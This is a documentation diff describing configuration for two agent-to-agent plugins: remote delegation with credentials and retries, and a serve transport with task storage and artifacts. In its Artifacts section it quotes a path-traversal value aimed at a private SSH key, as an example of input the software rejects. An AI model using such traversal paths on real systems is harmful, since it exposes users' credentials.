@@ -531,6 +531,218 @@ Each `agents[]` entry:
 | `bearer_token_env` | string | *(none)*                 | Name of an environment variable holding the bearer token. Read at `Init`; used only when `bearer_token` is unset. |
 | `timeout_seconds`  | int    | *(plugin default)*       | Per-agent default timeout (seconds), overriding the plugin-level `timeout_seconds`. |
 
+### `nexus.agent.a2a_remote`
+
+Source: `plugins/agents/a2aremote/`. The **outbound** half of Nexus's
+[A2A interoperability](../guides/a2a.md): where
+[`nexus.io.a2a`](#nexusioa2a) *serves* this instance as an A2A agent, this plugin
+lets a Nexus agent *call* remote A2A agents. Each configured remote registers one
+LLM-facing tool (default `delegate_a2a_<name>`); a call sends the delegated task
+over the A2A wire through `pkg/a2a/a2aclient`, and folds the remote task's final
+text and artifacts back into the tool result under XML tag boundaries.
+
+Remotes come from **configuration only** — the tool schema exposes no URL, host
+or endpoint parameter, so a model cannot point the instance at an arbitrary
+address. See [Remote A2A Agents](../plugins/agents/a2a-remote.md).
+
+Each remote's **Agent Card is fetched lazily, on first use, never at boot**: an
+unreachable remote must not be able to fail engine startup. Until the card
+resolves the tool carries the configured `description`; the first successful call
+replaces it with a description built from the card's own `skills` and
+re-registers the tool once.
+
+Every failure — unreachable card, refused binding, protocol error, dead stream,
+exhausted budget, a task that ends `FAILED` — becomes a clean `tool.result`
+error, never an engine-level failure.
+
+A remote that parks at `INPUT_REQUIRED` is **not** a failure: the question is
+raised on the local bus as `hitl.requested`, the human's answer resumes the
+remote task with the same `taskId` and `contextId`, and the delegation carries on.
+The delegating model never sees the question. See the `hitl` block below.
+
+| Key                   | Type   | Default | Description |
+|-----------------------|--------|---------|-------------|
+| `agents`              | list   | *(required)* | Non-empty list of remote A2A agents to expose. Each entry is a mapping (see below). |
+| `cache`               | bool   | `true`  | Set `false` to disable result caching entirely. |
+| `cache_size`          | int    | `128`   | Capacity of the in-process LRU result cache (entries, not bytes). Zero disables eviction. |
+| `max_depth`           | int    | `3`     | Hard cap on delegation depth across all remotes. Zero disables the cap. A posture's `max_recursion_depth` may narrow it further. |
+| `binding`             | string | `jsonrpc` | Default protocol binding. One of `jsonrpc`, `json-rpc`, `http+json`, `rest`. |
+| `validate_card`       | bool   | `true`  | Default for checking a fetched Agent Card against the specification's required fields. |
+| `stream`              | bool   | `true`  | Default for using the streaming operation. `false` forces a blocking `SendMessage`. |
+| `timeout`             | duration | `5m`  | Default whole-call deadline covering discovery, the message and the stream. |
+| `request_timeout`     | duration | `60s` | Default deadline for a control-plane call (Agent Card fetch, `GetTask`, `CancelTask`). `"0s"` disables it. |
+| `message_timeout`     | duration | `0s`  | Default deadline for a non-streaming `SendMessage`. Zero means none — a blocking send legitimately takes as long as the remote's work does. |
+| `stream_open_timeout` | duration | `30s` | Default deadline for a streaming call's response *headers*. `"0s"` disables it. |
+| `stream_idle_timeout` | duration | `5m`  | Default bound on total silence on an open stream. `"0s"` disables it. |
+| `progress`            | bool   | `true`  | Republish a remote run's incremental progress onto the local bus as `io.output` and `subagent.iteration`, so a long delegation is visible to the TUI, browser, AG-UI and A2A-serve transports. |
+| `hitl`                | map    | *(see below)* | Chained human-in-the-loop policy for a remote that parks at `INPUT_REQUIRED`. |
+| `extensions`          | list   | *(the Nexus extension)* | A2A protocol extension URIs to request via the `A2A-Extensions` service parameter. A server activates only what a client asked for. **Defaults to the [Nexus extension](../guides/a2a.md#the-nexus-extension-telemetry-a2a-has-no-field-for) URI**, because this plugin consumes a remote Nexus instance's telemetry to republish its progress; a remote that does not know the extension ignores the header. Set `[]` to request none. |
+| `retry`               | map    | *(see below)* | Default retry policy for outbound calls. |
+
+Every key from `binding` down is a **default**; each `agents[]` entry may
+override it. An agent-level `extensions` list replaces the inherited one
+wholesale rather than merging, so an empty list means "declare none".
+
+Each `agents[]` entry:
+
+| Key                   | Type   | Default | Description |
+|-----------------------|--------|---------|-------------|
+| `name`                | string | *(required)* | Human-friendly identifier; used to derive the default tool name. |
+| `base_url`            | string | *(required\*)* | Base URL the remote is served under — the origin and optional path prefix, **not** an operation endpoint. The Agent Card is fetched from `/.well-known/agent-card.json` beneath it. Required unless `jsonrpc_endpoint` or `rest_endpoint` pins an endpoint. |
+| `jsonrpc_endpoint`    | string | *(none)* | Pin the JSON-RPC endpoint URL, skipping Agent Card discovery for it. |
+| `rest_endpoint`       | string | *(none)* | Pin the HTTP+JSON base URL — the prefix operation paths hang off, not one operation URL. |
+| `tool_name`           | string | `delegate_a2a_<name>` | Override the LLM-facing tool name. The default lowercases `name` and collapses non-alphanumeric runs to `_`. |
+| `description`         | string | *(auto)* | Tool description used **until** the Agent Card resolves. Once it does, the description is rebuilt from the card's own skills. |
+| `posture`             | string | *(none)* | Registered `AgentPosture` supplying this remote's timeout and recursion-depth cap. Requires the `posture.registry` capability (`nexus.agent.postures`). |
+| `binding`             | string | *(plugin default)* | Per-agent override. |
+| `validate_card`       | bool   | *(plugin default)* | Per-agent override. |
+| `stream`              | bool   | *(plugin default)* | Per-agent override. |
+| `timeout`             | duration | *(plugin default)* | Per-agent override. |
+| `request_timeout`     | duration | *(plugin default)* | Per-agent override. |
+| `message_timeout`     | duration | *(plugin default)* | Per-agent override. |
+| `stream_open_timeout` | duration | *(plugin default)* | Per-agent override. |
+| `stream_idle_timeout` | duration | *(plugin default)* | Per-agent override. |
+| `progress`            | bool   | *(plugin default)* | Per-agent override. |
+| `hitl`                | map    | *(plugin default)* | Per-agent override, key by key: a block setting only `enabled` leaves `input_timeout` and `max_rounds` inherited. |
+| `extensions`          | list   | *(plugin default)* | Per-agent override; replaces rather than merges. |
+| `retry`               | map    | *(plugin default)* | Per-agent override. |
+| `credentials`         | map    | *(none)* | Credential this instance presents to **this** remote. Per agent only — see below. |
+
+The `hitl` block, at either level:
+
+| Key             | Type     | Default | Description |
+|-----------------|----------|---------|-------------|
+| `enabled`       | bool     | `true`  | Route a remote's `INPUT_REQUIRED` question to a human via `hitl.requested`, and resume the remote task with the answer. `false` restores the pre-chaining behaviour: a parked task becomes a clean tool error carrying the question. |
+| `input_timeout` | duration | `15m`   | Deadline for **one** question waiting on a human. The outbound twin of `nexus.io.a2a`'s `tasks.input_timeout`. `"0s"` removes this deadline specifically. |
+| `max_rounds`    | int      | `4`     | How many times one delegated call may bounce a question back to the human. `0` removes the cap. |
+
+**Two deadlines run while a task is parked, and the earlier one wins.** The
+whole-call `timeout` keeps running — a remote waiting on a human is still work
+this session authorized, and pausing the budget is how an unanswered question
+pins a session for ever — and `hitl.input_timeout` bounds the individual
+question. With the `5m` default `timeout` the **call budget expires first**, so
+`input_timeout` only bites once `timeout` is raised; an operator who expects a
+remote to ask questions should raise both. Whichever fires, the outcome is the
+same and the tool error names the deadline that fired: the question is retracted
+with `hitl.cancel`, the remote task is cancelled with `CancelTask`, and the
+delegating model is told the question went unanswered **and told not to answer it
+itself**.
+
+`AUTH_REQUIRED` is deliberately **not** routed to a human — no answer a person
+types into a chat is a credential — and reports that the agent's `credentials`
+need configuring.
+
+Anything a human answered is **never cached**. A person's answer is a decision
+made at a moment, and replaying it for a later identical task would apply that
+decision again without asking.
+
+The `credentials` block exists **only** inside an `agents[]` entry. There is
+deliberately no plugin-level default: a default credential silently applied to a
+remote added later is how a token reaches a host it was never issued for.
+
+Everything a credentials block can be wrong about is checked at **`Init`**: an
+unset environment variable, a key belonging to a different `type`, an unreadable
+or mismatched client certificate, or an OAuth2 remote with no way to reach a
+token endpoint each fail boot with a message naming the agent and the key — not
+a `401` on the first delegation. **No credential value is ever logged**, on any
+path, including failures.
+
+| Key    | Type   | Default | Description |
+|--------|--------|---------|-------------|
+| `type` | string | *(required)* | One of `none`, `bearer`, `oauth2_client_credentials`, `mtls`. The types are mutually exclusive; a key belonging to another type is rejected at boot. |
+
+`type: bearer` — a static token, following the same `api_key` / `api_key_env`
+convention the LLM providers use:
+
+| Key         | Type   | Default | Description |
+|-------------|--------|---------|-------------|
+| `token`     | string | *(none)* | The token, inline. Takes precedence over `token_env` when both are set. Prefer `token_env`; an inline secret lives in the config file. |
+| `token_env` | string | *(none)* | Name of an environment variable holding the token. Read once at `Init`; a variable that is unset or empty **fails boot**. |
+| `header`    | string | `Authorization` | Header the token rides in. |
+| `scheme`    | string | `Bearer` | The scheme word before the token. Set it to `""` to send the bare token, which is what an `X-Api-Key` style header wants. |
+
+`type: oauth2_client_credentials` — the RFC 6749 §4.4 machine-to-machine grant,
+implemented over `net/http` (no `golang.org/x/oauth2` dependency). The token is
+cached and refreshed ahead of expiry, and a burst of concurrent calls triggers
+**one** token request, not one per caller:
+
+| Key                 | Type     | Default | Description |
+|---------------------|----------|---------|-------------|
+| `client_id`         | string   | *(none)* | The client id, inline. Prefer `client_id_env`. |
+| `client_id_env`     | string   | *(none)* | Name of an environment variable holding the client id. |
+| `client_secret`     | string   | *(none)* | The client secret, inline. Prefer `client_secret_env`. |
+| `client_secret_env` | string   | *(none)* | Name of an environment variable holding the client secret. |
+| `token_url`         | string   | *(discovered)* | The token endpoint. Optional when the agent has a `base_url`: it is then discovered from the card's `oauth2` `clientCredentials` flow on first use. **Required** for an agent that pins `jsonrpc_endpoint`/`rest_endpoint` instead, since there is no card to discover it from. |
+| `scopes`            | list     | *(none)* | Scopes requested in the token request, joined with spaces. Not defaulted from the card: requesting every scope a remote advertises is broader than any deployment needs. |
+| `audience`          | string   | *(none)* | Value of the widely-supported (non-standard) `audience` parameter. Sent only when set. |
+| `auth_style`        | string   | `basic`  | How the client authenticates to the token endpoint. `basic` is HTTP Basic per RFC 6749 §2.3.1; `body` puts `client_id`/`client_secret` in the form body, for a server that only accepts that. |
+| `refresh_leeway`    | duration | `30s`    | How far ahead of the stated expiry a token is replaced. Clamped to half the token lifetime when the lifetime is shorter than the leeway. A server that omits `expires_in` is assumed to have issued a 60-second token. |
+
+One id/secret pair is required: set `client_id` or `client_id_env`, and
+`client_secret` or `client_secret_env`. When `token_url` is being discovered
+from the card, the well-known Agent Card fetch — and only that fetch — goes out
+unauthenticated, because the token cannot be obtained before the endpoint that
+issues it is known. Specification §8.2 makes the well-known card a public
+document; a remote that protects its card wants `token_url` set explicitly.
+
+`type: mtls` — client-certificate authentication, wired into the
+`http.Transport`. Every path is resolved through the engine's `~` expansion and
+read at `Init`:
+
+| Key           | Type   | Default | Description |
+|---------------|--------|---------|-------------|
+| `cert_file`   | string | *(required)* | Path to the PEM client certificate. |
+| `key_file`    | string | *(required)* | Path to the PEM private key matching `cert_file`. |
+| `ca_file`     | string | *(system roots)* | Path to a PEM bundle used to verify the **remote's** certificate, for a private CA. |
+| `server_name` | string | *(from the URL)* | Override the TLS server name used for SNI and certificate verification, for a remote reached by an address its certificate does not name. |
+
+On the **first** call to a remote — never at boot, since the card is fetched
+lazily — the configured credential is compared against the card's
+`securitySchemes`, and an obvious mismatch (a bearer token against a card
+declaring only `mutualTls`, say) logs one **warning**. It warns rather than
+refuses: a card's `securitySchemes` block is optional and routinely incomplete,
+and refusing on that evidence would break working deployments over a
+documentation defect.
+
+The `retry` block, at either level:
+
+| Key            | Type     | Default  | Description |
+|----------------|----------|----------|-------------|
+| `max_attempts` | int      | `3`      | Total attempts including the first. `1` disables retrying. |
+| `base_delay`   | duration | `200ms`  | Delay before the second attempt; doubles thereafter. |
+| `max_delay`    | duration | `5s`     | Cap on the computed backoff. A longer `Retry-After` from the server is still honoured in full. |
+
+Reads are retried on transport failures and `502`/`504`; every operation is
+retried on `429`/`503`. A message send is **never** retried on a transport
+failure, because A2A defines no idempotency key and a blind retry would run the
+remote's work twice.
+
+Every duration key is a **duration string** (`"90s"`, `"5m"`, `"1h30m"`), never a
+bare number: `timeout: 600` reads as ten minutes to an operator and six hundred
+nanoseconds to Go, so a bare number is rejected rather than guessed at.
+
+**Timeout precedence** for one call, first match wins: the tool's
+`timeout_seconds` argument → the agent's `posture` budget `timeout` → the
+`timeout` key (agent-level, else plugin-level) → the `5m` built-in default.
+
+**Posture budgets.** Only two dimensions of an `AgentPosture` cross an A2A
+boundary — `default_budget.timeout` and `max_recursion_depth` — because the
+protocol gives a client no control over the remote's token or tool-call spend.
+A posture whose `default_budget` sets `max_tokens` or `max_tool_calls` is
+**refused** for a remote agent rather than half-honoured, and the call fails with
+an error naming the key.
+
+**Caching.** Successful outcomes are cached in the LRU under a content hash of
+(remote identity, posture version, task, canonicalized context). Failures are
+never cached, so a remote that was briefly down is retried rather than replayed,
+and neither is any outcome a human answered a question for.
+
+**Cancellation.** `cancel.active` — the event `nexus.control.cancel` emits once a
+cancellation is happening — retracts any question this plugin put in front of a
+human, issues `CancelTask` to every remote task in flight, and aborts the calls.
+The same abandonment runs on the ordinary exits too: if this instance walks away
+from a remote task that has not reached a terminal state, it tells the remote.
+
 ### `nexus.scene`
 
 Source: `plugins/scene/plugin.go`. Owns the per-session `Scene` store and
@@ -1499,6 +1711,577 @@ disabled. Nothing keys behaviour on it yet — this transport serves a single
 engine/session per listener and admits one run at a time, so there is no second
 principal for an authorization decision to distinguish.
 
+### `nexus.io.a2a`
+
+Source: `plugins/io/a2a/`. Agent2Agent (A2A) **serve** transport: exposes this
+Nexus instance as an A2A agent over one HTTP listener carrying three surfaces —
+the `/.well-known/agent-card.json` discovery document, the JSON-RPC 2.0 binding,
+and the HTTP+JSON/REST binding. The wire format is `pkg/a2a` (A2A specification
+1.0.x); this plugin contributes the listener, the credential guard, the card
+assembly and the routing. Safe by default: binds loopback, optional auth through
+the shared `pkg/nexusauth` chain, and CORS off unless configured. The
+[A2A Interoperability guide](../guides/a2a.md) covers the protocol mapping and a
+worked end-to-end example; [`nexus.io.a2a`](../plugins/io/a2a.md) is the plugin
+page.
+
+> **Maturity.** Every A2A operation outside the push-notification family is
+> wired. `SendMessage` and `SendStreamingMessage` drive a real Nexus turn; every
+> task they create is **persisted durably** (see [Task retention](#task-retention)
+> below) and `GetTask`, `ListTasks` and `SubscribeToTask` read it back — see
+> [Reading tasks](#reading-tasks) below. A task interrupted by a
+> human-in-the-loop question parks at `TASK_STATE_INPUT_REQUIRED` and is resumed
+> by a message naming the same `taskId`, and `CancelTask` settles a task at
+> `TASK_STATE_CANCELED` — see
+> [Interruption and cancellation](#interruption-and-cancellation) below. The
+> Agent Card reports all of this honestly: `capabilities.streaming` is `true`
+> because both streaming operations are wired, while `pushNotifications` and
+> `extendedAgentCard` are `false`. (A2A declares no capability boolean for
+> cancellation; it is part of the core task surface.) A turn publishes its final
+> text, its structured output, **every** tool result and every file it wrote as
+> Artifacts, and the card declares the Nexus telemetry extension — see
+> [Artifacts](#artifacts) and [The Nexus extension](#the-nexus-extension) below.
+
+| Key                     | Type         | Default              | Description |
+|-------------------------|--------------|----------------------|-------------|
+| `bind`                  | string       | `127.0.0.1:8091`     | `host:port` the HTTP listener binds to. Loopback by default so the endpoint is not network-exposed without explicit opt-in. An empty string falls back to the default. |
+| `public_url`            | string       | `http://<bind>`      | Absolute base URL advertised in the card's `supportedInterfaces`. The default is right for the loopback bind and wrong the moment a reverse proxy is involved — set it to the externally reachable origin whenever `bind` is not what clients dial. A trailing `/` is trimmed. |
+| `jsonrpc_path`          | string       | `/a2a`               | Absolute path the JSON-RPC 2.0 binding is mounted at (`POST` only). Must differ from `rest_prefix`; a relative path or a collision is a boot error. |
+| `rest_prefix`           | string       | `/a2a/v1`            | Absolute path prefix the HTTP+JSON/REST binding is mounted under; the operation paths of A2A specification §11.3 (`/message:send`, `/tasks/{id}`, `/tasks/{id}:cancel`, …) hang off it. Must differ from `jsonrpc_path`. |
+| `strict_version_header` | bool         | `false`              | How an **absent** `A2A-Version` service parameter is read. See [A2A version negotiation](#a2a-version-negotiation) below. |
+| `card_requires_auth`    | bool         | `false`              | Whether `GET /.well-known/agent-card.json` is gated by the validator chain. See [Agent Card auth posture](#agent-card-auth-posture) below. |
+| `cors_origins`          | string or list<string> | *(empty)*  | Allowed CORS origins. A single `*` echoes any request Origin; an explicit list echoes only matching origins. Empty means no CORS header at all (same-origin only). Accepts a YAML list **or** a single comma-separated string. |
+| `bearer_token`          | string       | *(empty)*            | Inline bearer token, desugared into a one-entry `static` validator. Takes precedence over `bearer_token_env`. Mutually exclusive with `auth`. |
+| `bearer_token_env`      | string       | *(empty)*            | Name of an environment variable holding the bearer token. Used only when `bearer_token` is empty. Mutually exclusive with `auth`. |
+| `auth`                  | map          | *(absent)*           | Validator-chain block, parsed by the **same** `pkg/nexusauth` parser the session broker and `nexus.io.agui` use, so `static`, `jwks`, `introspect` and `proxy_headers` are all available. The card's `securitySchemes` are derived from it — see [Agent Card security](#agent-card-security-schemes) below. Every rule documented under [Authentication (`auth:`)](#authentication-auth) applies verbatim; `auth.admin_scope` is broker-only and is rejected here. |
+| `card`                  | map          | *(absent)*           | The hand-authored Agent Card. Exactly one of `card` or `card_file` is **required**. See [Agent Card content](#agent-card-content) below. |
+| `card_file`             | string (path)| *(absent)*           | Path to a JSON file holding a complete A2A Agent Card document (camelCase wire shape). Expanded through `engine.ExpandPath`, so `~` and `~/...` work. Mutually exclusive with `card`. |
+| `tasks`                 | map          | *(absent)*           | Retention policy for the durable task store. Both knobs have non-zero defaults; see [Task retention](#task-retention) below. |
+| `artifacts`             | map          | *(absent)*           | What a turn publishes as Artifacts, and the caps that bound it. Every knob has a non-zero default; see [Artifacts](#artifacts) below. |
+
+**Schema-validated at boot.** The plugin ships `plugins/io/a2a/schema.json` and
+implements `ConfigSchema()`, so the engine validates this block — including
+everything under `auth:` and `card:` — **before `Init` runs**, with
+`additionalProperties: false` at every object level. The schema also enforces
+that one of `card`/`card_file` is present. The table above is the whole
+top-level surface; any key not listed is rejected.
+
+#### Running a turn
+
+A `SendMessage` or `SendStreamingMessage` becomes one Nexus turn, reported as
+one A2A Task. There is no configuration for any of this; it is the fixed
+behaviour of the transport.
+
+| A2A | Nexus |
+|---|---|
+| The message's text parts | `before:io.input` (vetoable, so the same gates that see a TUI keypress see this) then `io.input` |
+| Task created `SUBMITTED` | the request is accepted |
+| Task `WORKING` | `agent.turn.start` |
+| Artifact with a text Part | the turn's final assistant text, taken from `io.output` (or the terminal `llm.response` when no output was published) |
+| An extra `application/json` Part on that artifact | the same text when it is a JSON document — see [Artifacts](#artifacts) |
+| One Artifact per tool result | every `tool.result`, unconditionally |
+| One Artifact per written file | a path a `tool.result` reported writing |
+| `TaskStatusUpdateEvent.metadata` under the Nexus extension URI | `thinking.step`, `tool.invoke`, `subagent.*`, and `llm.response` token usage — only for clients that opted in |
+| Task `COMPLETED` | `agent.turn.end` |
+| Task `FAILED` | a `core.error` that is fatal or has exhausted its retries, or a vetoed input |
+
+`SendMessage` **blocks** until the task reaches a state the caller has to act
+on and returns the Task, which is A2A's default (§3.2.2). That means a terminal
+state **or** `INPUT_REQUIRED`: a task waiting for the caller cannot be waited on
+by the caller. `SendStreamingMessage` writes the same frames as SSE — an opening
+Task snapshot, status updates, the artifact, and the terminal status that closes
+the stream.
+
+`configuration.returnImmediately` is **honoured**: the call answers with the
+task as it stands and the client follows it with `GetTask` or
+`SubscribeToTask`. It was refused for as long as a run's lifetime was its
+request's; see [Task lifetime](#task-lifetime) below. `SendStreamingMessage`
+ignores the flag, because a stream is already the follow-up it asks for.
+
+Other refusals, each with the error type the specification reserves for it: a
+non-text Part or an `acceptedOutputModes` list with no text type
+(`ContentTypeNotSupportedError`), an inline `taskPushNotificationConfig`
+(`PushNotificationNotSupportedError`), and a second task while one is in flight
+(`UnsupportedOperationError`; the listener fronts one agent loop). A message
+naming a `taskId` is a **continuation**, not a refusal — see
+[Interruption and cancellation](#interruption-and-cancellation).
+
+#### Task lifetime
+
+A run is this listener's single active task and is released when the **task**
+reaches a terminal state — not when the HTTP request that started it returns.
+Three things follow, and they are the reason interruption works at all:
+
+- A client may **disconnect mid-turn** without failing its own task. The turn
+  carries on, `GetTask` still answers, and `SubscribeToTask` reattaches to
+  exactly where it got to.
+- A task may stay parked on a question for as long as answering it takes,
+  bounded by `tasks.input_timeout`.
+- `configuration.returnImmediately` is answerable.
+
+The cost is that a turn nobody is watching holds the slot until something ends
+it, which is why `CancelTask` is wired and why an unanswered question has a
+deadline. A task left non-terminal by a **process restart** is settled at
+`FAILED` when the store next opens: no run drives it, no bus event will ever
+name it, and only terminal tasks are evictable, so leaving it would be an
+immortal row reading `WORKING` for ever.
+
+#### Interruption and cancellation
+
+There is no configuration here beyond `tasks.input_timeout`; the behaviour is
+fixed.
+
+**A question parks the task.** When a Nexus agent asks a human something —
+`nexus.control.hitl`'s `ask_user` tool, or any plugin emitting `hitl.requested` —
+the task moves to `TASK_STATE_INPUT_REQUIRED` with the question on
+`status.message`, and a multiple-choice question renders its option ids into
+that text so a text-only A2A client can answer it. The task stays **live**: open
+SSE streams stay open (§11.7's close rule keys off terminal states, which this
+is not), the transition is written through to the store, and a client that
+reconnects reads the question from `GetTask` or from `SubscribeToTask`'s opening
+snapshot.
+
+**A message naming the same `taskId` resumes it** (§3.4). The answer is routed
+to `hitl.responded` and the task returns to `WORKING` **inside the same turn** —
+no `io.input`, no second task. An answer whose text matches one of the
+question's option ids (case-insensitively) is delivered as that choice; anything
+else is free text. Continuing a task is refused, with
+`UnsupportedOperationError`, when it is already terminal, when the message names
+a different `contextId` than the task's, or when the task is not waiting for
+input. A `taskId` that does not belong to the caller answers exactly as an
+unknown one does: `TaskNotFoundError`.
+
+**`CancelTask` settles the task at `TASK_STATE_CANCELED`,** then tells the bus —
+`hitl.cancel` if the task was parked, so the blocked agent loop unblocks, then
+`cancel.request`, which is the `control.cancel` capability's own entry point
+(the same event the TUI emits). Any open stream closes on the terminal frame.
+Cancelling an **already-terminal** task is refused with
+`TaskNotCancelableError` and writes nothing: a terminal state is final, so
+reporting success would tell a client its cancel took effect on a task that had
+already completed.
+
+#### Task retention
+
+Every task this listener creates is written to a SQLite database at
+`<session>/plugins/nexus.io.a2a/store.db`, opened through the engine's
+[per-plugin storage](../architecture/storage.md) capability at **session**
+scope. There is no bespoke file format and no separate cleanup job: archiving
+the session disposes of its tasks with it. A listener that cannot open the store
+**does not start** — a task that existed only for the lifetime of its request is
+exactly the lie the store exists to prevent.
+
+The record holds the task id, its `contextId`, the current state with its
+timestamp, the full status-transition history, every artifact, message
+references for both sides of the exchange, and the authenticated `Principal`
+that created it. Reads are **principal-scoped**: a caller can only ever reach
+tasks filed under its own principal id, and there is no unscoped query in the
+store's API to reach for by mistake. With no `auth:` block configured every
+caller is unauthenticated and shares one partition.
+
+Retention is load-bearing rather than housekeeping — a task carries its history
+and its artifacts, so an unbounded store would grow with traffic rather than
+with the conversation. Both knobs are enforced on open and after every task
+creation, and a task is evicted when it exceeds **either** of them. Only
+**terminal** tasks are evictable: a live task is the one a client is most likely
+to be following, so it is never dropped mid-turn. Non-terminal tasks still
+*count* against the per-context cap, so a wedged in-flight task shows up as
+retention pressure instead of exempting itself from it.
+
+| Key                     | Type            | Default | Description |
+|-------------------------|-----------------|---------|-------------|
+| `tasks.ttl`             | duration string | `24h`   | How long a terminal task is kept after its last transition. `"0s"` disables age-based eviction and keeps tasks for the life of the session. A bare number is rejected: `600` reads as ten minutes to an operator and six hundred nanoseconds to Go. Must not be negative. |
+| `tasks.max_per_context` | int             | `200`   | How many tasks are kept per (principal, `contextId`) pair. `0` disables the cap. The cap is per **principal and** context, not per context alone, so one principal's traffic cannot evict another's tasks. Must not be negative. |
+| `tasks.input_timeout`   | duration string | `15m`   | How long a task may stay parked at `TASK_STATE_INPUT_REQUIRED` waiting for the client to answer the agent's question. On expiry the task is driven to `FAILED` (a real terminal transition, so every attached stream closes) and `hitl.cancel` retracts the question so the blocked agent loop unblocks. `"0s"` disables the deadline. A bare number is rejected, as for `ttl`. Must not be negative. |
+
+The defaults are chosen for the standalone single-context listener: 24 hours is
+comfortably longer than any plausible client reconnect window, and 200 tasks is
+200 turns of history — far more than a client polls back over.
+
+**Sizing.** The artifact side of the store is bounded by
+`artifacts.max_task_bytes x tasks.max_per_context`, which at the shipped defaults
+is `1 MiB x 200` ≈ **200 MiB** in the worst case where every retained task
+saturates its artifact budget. No ordinary session approaches that — a turn's
+artifacts are the tool outputs it actually produced — but the product is stated
+rather than implied, so an operator who cannot afford the worst case lowers one
+of the two knobs by arithmetic instead of by guesswork. See
+[Artifacts](#artifacts).
+
+`input_timeout` is not retention — it is a **liveness** bound, and it defaults to
+a non-zero value for a reason worth stating. A parked task is not idle: the turn
+that asked the question is blocked inside `ask_user`, holding this listener's
+single active-task slot and the process's one agent loop, so a question nobody
+answers pins the whole instance. **15 minutes** is measured against a human, not
+a machine — long enough for someone to be paged, read the question and reply,
+short enough that an abandoned question frees the instance within one coffee
+break. Set `"0s"` only if a task parked until the process exits is genuinely what
+you want.
+
+```yaml
+plugins:
+  nexus.io.a2a:
+    tasks:
+      ttl: 72h
+      max_per_context: 50
+      input_timeout: 5m
+```
+
+#### Artifacts
+
+A2A puts task **output** in artifacts and conversation in messages (§3.7). Four
+things a Nexus turn produces are output by that reading, and all four are
+published without an operator enabling anything:
+
+| Artifact | `artifactId` | Contents |
+|---|---|---|
+| The turn's answer | `<taskId>-response` | A text Part. Plus an `application/json` Part when the answer **is** a JSON document (one surrounding markdown fence is unwrapped first), so structured output is a document rather than a string a client has to re-parse. When an `llm.request` declared a `json_schema`, the artifact's metadata names it under `nexus.output.schema`. |
+| One per tool result | `<taskId>-tool-<callId>` | A text Part with the tool's output (or its error, flagged `nexus.tool.failed`), plus an `application/json` Part when the tool produced structured output. Metadata carries `nexus.tool.name` and `nexus.tool.callId`. |
+| One per written file | `<taskId>-file-<path>` | The file's bytes as an inline base64 `raw` Part with its filename and media type — or a metadata note when the file is over the cap. |
+| The suppression notice | `<taskId>-artifacts-truncated` | Present only when the task spent its artifact budget; says how many artifacts were withheld. |
+
+**Tool results are artifacts unconditionally.** There is no key to turn them off,
+deliberately: an interop transport whose observability depends on the operator
+having enabled it is one a partner cannot rely on. The volume that buys is
+answered by the caps below rather than by a flag.
+
+**A human-in-the-loop question is *not* an artifact.** It rides the
+`INPUT_REQUIRED` status message and the task's message history, which is where a
+request for input belongs — putting it in the output channel as well would count
+one event twice.
+
+**File detection is `tool.result`-based, and is incomplete by design.** A file is
+published only when a tool *reports* having written it: through the engine's own
+`ToolResult.OutputFile` field (honoured for every tool), or through a
+structured-output key named by `artifacts.file_sources`. Snapshot-diffing the
+session workspace is out of scope, so **a write by an uninstrumented path is
+missed** — a shell command redirecting into a file reports stdout and an exit
+code and nothing about the file, so nothing is published for it. `nexus.tool.shell`
+therefore has **no default rule**; an operator whose shell wrapper does report a
+written path adds one to `file_sources`.
+
+Every reported path is resolved against `artifacts.file_base_dir` and **confined
+to it**, symlinks followed. A path that escapes is dropped rather than clamped: a
+tool reporting `../../.ssh/id_rsa` is either broken or hostile, and inlining what
+it named into a response that leaves the process cannot be walked back.
+
+`configuration.acceptedOutputModes` is **honoured, not merely validated**: a
+request naming only text media types gets no `application/json` Part and no
+inline file contents. The files are still reported, as the same metadata note an
+oversized file gets, so the client learns they exist.
+
+| Key                              | Type            | Default   | Description |
+|----------------------------------|-----------------|-----------|-------------|
+| `artifacts.max_file_bytes`       | int (bytes)     | `262144`  | Largest file whose contents are inlined as a base64 `raw` Part. A larger file **degrades to a metadata note** naming the file, its size and the cap — never a silent drop and never an unbounded inline. `0` means no file is ever inlined; every detected file becomes a note. Inline content is base64 in JSON, so it costs roughly a third more on the wire than on disk. Must not be negative. |
+| `artifacts.max_tool_output_bytes`| int (bytes)     | `16384`   | Largest tool-result text carried on a tool-result artifact. Longer output is truncated on a rune boundary with a note saying how much was shown, and the artifact is flagged `nexus.artifact.truncated`. `0` disables the cap. Must not be negative. |
+| `artifacts.max_task_bytes`       | int (bytes)     | `1048576` | One task's total artifact budget, counting every artifact **except** the final response — which is the turn's answer and is never suppressed. When the budget is spent, further artifacts are suppressed and one notice artifact records how many. `0` disables the budget, which makes the store's artifact growth unbounded. Must not be negative. |
+| `artifacts.file_base_dir`        | string (path)   | *(the session's `files/` directory)* | Directory that reported file paths are resolved against and confined to. Expanded through `engine.ExpandPath`, so `~` works. Set it to match `nexus.tool.fileio`'s `base_dir` if you moved that. With no session and no value set, file artifacts are **disabled**: there is no safe base to resolve a relative path against. |
+| `artifacts.file_sources`         | `map<string, string or list<string>>` | `{write_file: [path]}` | Which structured-output keys of which tools carry the paths those tools wrote. The default matches `nexus.tool.fileio`'s `write_file`. Setting this key **replaces** the default wholesale rather than merging with it. `ToolResult.OutputFile` is always honoured on top of it, for every tool. |
+
+The caps are **load-bearing rather than tuning**. Unconditional tool-result
+artifacts, times inline base64 file parts, times a disk-persisted store, is an
+unbounded product; these three caps are what make it a bounded one. Per artifact
+it is `max_file_bytes` / `max_tool_output_bytes`; per task it is
+`max_task_bytes`; per store it is `max_task_bytes x tasks.max_per_context`.
+
+```yaml
+plugins:
+  nexus.io.a2a:
+    artifacts:
+      max_file_bytes: 1048576
+      max_tool_output_bytes: 8192
+      max_task_bytes: 4194304
+      file_base_dir: "~/agent-workspace"
+      file_sources:
+        write_file: [path]
+        render_report: [output_path]
+```
+
+#### The Nexus extension
+
+Thinking steps, tool calls, subagent progress and token counts have no canonical
+A2A field. They ride the Nexus extension instead, whose URI is
+
+```
+https://github.com/frankbardon/nexus/a2a/extensions/agent-events/v1
+```
+
+There is **no configuration for it**: it is declared in the Agent Card under
+`capabilities.extensions` for the same reason the capability booleans are
+derived, and it is never `required` — everything it carries is supplementary, so
+a client that ignores it still receives a complete canonical stream.
+
+| Nexus event | Extension event kind | Payload |
+|---|---|---|
+| `thinking.step` | `thinking` | The reasoning text and its index within the turn. |
+| `tool.invoke` | `tool_call` | The call id, tool name and the JSON arguments the model produced. |
